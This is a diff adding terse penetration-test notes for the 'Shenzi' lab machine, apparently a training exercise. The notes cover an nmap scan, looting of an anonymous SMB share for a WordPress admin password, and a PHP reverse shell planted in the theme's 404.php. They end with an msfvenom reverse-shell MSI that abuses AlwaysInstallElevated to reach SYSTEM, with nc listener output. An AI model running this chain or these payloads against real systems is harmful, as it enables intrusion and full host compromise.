@@ -1,0 +1,140 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.190.55 > Shenzi.txt
+PORT      STATE SERVICE       VERSION
+21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
+| ftp-syst: 
+|_  SYST: UNIX emulated by FileZilla
+80/tcp    open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
+|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
+|_http-favicon: Unknown favicon MD5: 56F7C04657931F2D0B79371B2D6E9820
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-title: Welcome to XAMPP
+|_Requested resource was http://192.168.190.55/dashboard/
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+443/tcp   open  ssl/http      Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
+|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
+| tls-alpn: 
+|_  http/1.1
+| ssl-cert: Subject: commonName=localhost
+| Issuer: commonName=localhost
+| Public Key type: rsa
+| Public Key bits: 1024
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2009-11-10T23:48:47
+| Not valid after:  2019-11-08T23:48:47
+| MD5:     a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0
+| SHA-1:   b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6
+|_SHA-256: 0169 7338 0c0f 1df0 0bd9 593e d8d5 efa3 706c d6df 7993 f614 1272 b805 22ac dd23
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_ssl-date: TLS randomness does not represent time
+| http-title: Welcome to XAMPP
+|_Requested resource was https://192.168.190.55/dashboard/
+|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
+445/tcp   open  microsoft-ds?
+3306/tcp  open  mysql         MariaDB 10.3.24 or later (unauthorized)
+5040/tcp  open  unknown
+7680/tcp  open  pando-pub?
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2026-05-07T03:41:02
+|_  start_date: N/A
+
+$ smbclient -L //192.168.190.55/ -N                           
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        IPC$            IPC       Remote IPC
+        Shenzi          Disk 
+$ smbclient //192.168.190.55/Shenzi -N
+Get file passwords.txt? 
+Get file readme_en.txt? 
+Get file sess_klk75u2q4rpgfjs3785h6hpipp? 
+Get file why.tmp? 
+Get file xampp-control.ini? 
+Found credentials.
+ WordPress:
+   User: admin
+   Password: FeltHeadwallWight357
+https://192.168.190.55/shenzi/
+Found wordpress page.
+Login with WordPress password.
+Go Appearnce
+Edit Themes
+Twenty Twenty: 404 Template (404.php)
+change 404.php code to revshell php Ivan Sincek. Then run any unknow directory to activate 404.php.
+
+$ rlwrap nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.233] from (UNKNOWN) [192.168.190.55] 60280
+SOCKET: Shell has connected! PID: 4360
+Microsoft Windows [Version 10.0.19042.1526]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\xampp\htdocs\shenzi>whoami
+shenzi\shenzi
+
+Upload winPEASany.exe
+AlwaysInstallElevated set to 1 in HKLM!
+AlwaysInstallElevated set to 1 in HKCU!
+
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+AlwaysInstallElevated    REG_DWORD    0x1
+
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+AlwaysInstallElevated    REG_DWORD    0x1
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.233 LPORT=4445 -f msi -o test.msi
+Upload to SHENZI, 
+msiexec /quiet /qn /i test.msi
+or .\test.msi
+
+$ rlwrap nc -nlvp 4445
+listening on [any] 4445 ...
+connect to [192.168.45.233] from (UNKNOWN) [192.168.190.55] 60475
+Microsoft Windows [Version 10.0.19042.1526]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\WINDOWS\system32>whoami
+whoami
+nt authority\system
+
+######################################################################################
+Key learning:
+winPEASany.exe
+AlwaysInstallElevated set to 1 in HKLM!
+AlwaysInstallElevated set to 1 in HKCU!
+
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+AlwaysInstallElevated    REG_DWORD    0x1
+
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+AlwaysInstallElevated    REG_DWORD    0x1
+This means that .msi files (Microsoft Software Installer) are automatically installed with Administrative privileges. That’s our solution. All we need to do to elevate our privileges is to create a malicious MSI file, then transfer and install it.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
